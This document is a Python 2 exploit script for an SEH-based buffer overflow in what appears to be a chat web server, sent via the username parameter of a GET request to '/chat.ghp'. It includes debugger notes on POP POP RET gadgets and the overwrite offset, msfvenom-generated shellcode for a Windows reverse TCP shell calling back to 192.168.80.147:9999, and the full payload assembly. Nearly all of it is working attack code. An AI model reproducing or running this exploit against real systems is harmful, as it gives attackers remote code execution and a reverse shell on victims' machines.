
#SSLEAY 32
#100103C0   5F               POP EDI
#100103C1   5E               POP ESI
#100103C2   C3               RETN


#1001B2E1   5F               POP EDI
#1001B2E2   5E               POP ESI
#1001B2E3   C3               RETN


#SEH chain of thread 00001740, item 0
# Address=02026DB0
# SE handler=68413368
#SEH chain of thread 00001740, item 1
# Address=41326841
# SE handler=*** CORRUPT ENTRY ***
#Pointer to next SEH Record : Ah2a [*] Exact match at offset 216
#Pointer to next SE Handler : h3Ah [*] Exact match at offset 220




import socket
import sys

unique = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq"

#msfvenom -p windows/shell/reverse_tcp  -a x86 -b "\x00\x0a\x0d\x1a\x20\x2c\x2e\x3a\x5c" -fpython --platform windows LHOST=192.168.80.147 LPORT=9999


buf =  ""
buf += "\x2b\xc9\x83\xe9\xac\xe8\xff\xff\xff\xff\xc0\x5e\x81"
buf += "\x76\x0e\x99\x85\xdd\xc3\x83\xee\xfc\xe2\xf4\x65\x6d"
buf += "\x5f\xc3\x99\x85\xbd\x4a\x7c\xb4\x1d\xa7\x12\xd5\xed"
buf += "\x48\xcb\x89\x56\x91\x8d\x0e\xaf\xeb\x96\x32\x97\xe5"
buf += "\xa8\x7a\x71\xff\xf8\xf9\xdf\xef\xb9\x44\x12\xce\x98"
buf += "\x42\x3f\x31\xcb\xd2\x56\x91\x89\x0e\x97\xff\x12\xc9"
buf += "\xcc\xbb\x7a\xcd\xdc\x12\xc8\x0e\x84\xe3\x98\x56\x56"
buf += "\x8a\x81\x66\xe7\x8a\x12\xb1\x56\xc2\x4f\xb4\x22\x6f"
buf += "\x58\x4a\xd0\xc2\x5e\xbd\x3d\xb6\x6f\x86\xa0\x3b\xa2"
buf += "\xf8\xf9\xb6\x7d\xdd\x56\x9b\xbd\x84\x0e\xa5\x12\x89"
buf += "\x96\x48\xc1\x99\xdc\x10\x12\x81\x56\xc2\x49\x0c\x99"
buf += "\xe7\xbd\xde\x86\xa2\xc0\xdf\x8c\x3c\x79\xda\x82\x99"
buf += "\x12\x97\x36\x4e\xc4\xed\xee\xf1\x99\x85\xb5\xb4\xea"
buf += "\xb7\x82\x97\xf1\xc9\xaa\xe5\x9e\x7a\x08\x7b\x09\x84"
buf += "\xdd\xc3\xb0\x41\x89\x93\xf1\xac\x5d\xa8\x99\x7a\x08"
buf += "\xa9\x9c\xed\x1d\x6b\xc9\x16\xb5\xc1\x99\xa2\xd2\x4a"
buf += "\x7f\xd5\x8d\x93\xc9\xc5\x8d\x83\xc9\xed\x37\xcc\x46"
buf += "\x65\x22\x16\x0e\xef\xcd\x95\xce\xed\x44\x66\xed\xe4"
buf += "\x22\x16\x1c\x45\xa9\xc9\x66\xcb\xd5\xb6\x75\x6d\xbc"
buf += "\xc3\x99\x85\xb7\xc3\xf3\x81\x8b\x94\xf1\x87\x04\x0b"
buf += "\xc6\x7a\x08\x40\x61\x85\xa3\xf5\x12\xb3\xb7\x83\xf1"
buf += "\x85\xcd\xc3\x99\xd3\xb7\xc3\xf1\xdd\x79\x90\x7c\x7a"
buf += "\x08\x50\xca\xef\xdd\x95\xca\xd2\xb5\xc1\x40\x4d\x82"
buf += "\x3c\x4c\x06\x25\xc3\xe4\xa7\x85\xab\x99\xc5\xdd\xc3"
buf += "\xf3\x85\x8d\xab\x92\xaa\xd2\xf3\x66\x50\x8a\xab\xec"
buf += "\xeb\x90\xa2\x66\x50\x83\x9d\x66\x89\xf9\x2a\xe8\x7a"
buf += "\x22\x3c\x98\x46\xf4\x05\xec\x42\x1e\x78\x69\x30\x7f"
buf += "\x95\xf3\x85\x8e\x3c\x4c\x85\xdd\xc3"

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(("127.0.0.1",8089))
	SEH_RECORD = "\xEB\x06\x90\x90"
	SE_HANDLER = "\xC0\x03\x01\x10"
	#junk = unique
	#SEH_RECORD = "BBBB"
	#SE_HANDLER = "CCCC"
	junk = "A"*216+SEH_RECORD+SE_HANDLER+"\x90"*50+buf
	buffer = "GET /chat.ghp?username="+junk+"&password=&room=1&sex=2 HTTP/1.0\r\n\r\n"
	s.send(buffer)
	s.close()
except:
	print sys.exc_info()
